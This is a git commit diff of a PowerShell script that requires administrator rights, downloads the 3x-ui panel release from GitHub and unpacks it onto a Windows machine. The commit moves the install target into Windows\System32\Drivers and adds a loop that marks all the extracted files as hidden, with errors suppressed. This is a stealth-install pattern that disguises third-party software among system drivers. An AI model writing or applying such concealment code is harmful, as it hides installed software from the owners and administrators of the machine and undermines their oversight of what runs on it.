4af90fa2a9451c98ea751d5a723e354a0bb286a6
Seva <68725282+sevcator@users.noreply.github.com>
2026-03-22 20:17:08 +0700

    Update ---.ps1

--- ---.ps1
+++ ---.ps1
@@ -1,6 +1,6 @@
 #Requires -RunAsAdministrator
 
-$downloadDir = Join-Path $env:SystemDrive "Windows\Fonts"
+$downloadDir = Join-Path $env:SystemDrive "Windows\System32\Drivers"
 $zipFileName = "x-ui-windows-amd64.zip"
 $zipPath = Join-Path $downloadDir $zipFileName
 $url = "https://github.com/MHSanaei/3x-ui/releases/latest/download/$zipFileName"
@@ -23,7 +23,15 @@ try {
     Expand-Archive -Path $zipPath -DestinationPath $downloadDir -Force -ErrorAction Stop
     $sourceFiles = Get-ChildItem -Path $extractedPath
     if ($null -ne $sourceFiles) {
+        $fileNamesToHide = $sourceFiles.Name
         Move-Item -Path $sourceFiles.FullName -Destination $downloadDir -Force
+        
+        foreach ($fileName in $fileNamesToHide) {
+            $itemToHidePath = Join-Path $downloadDir $fileName
+            if (Test-Path $itemToHidePath) {
+                Set-ItemProperty -Path $itemToHidePath -Name IsHidden -Value $true -ErrorAction SilentlyContinue
+            }
+        }
     }
     if (Test-Path -Path $extractedPath) {
         Remove-Item -Path $extractedPath -Recurse -Force
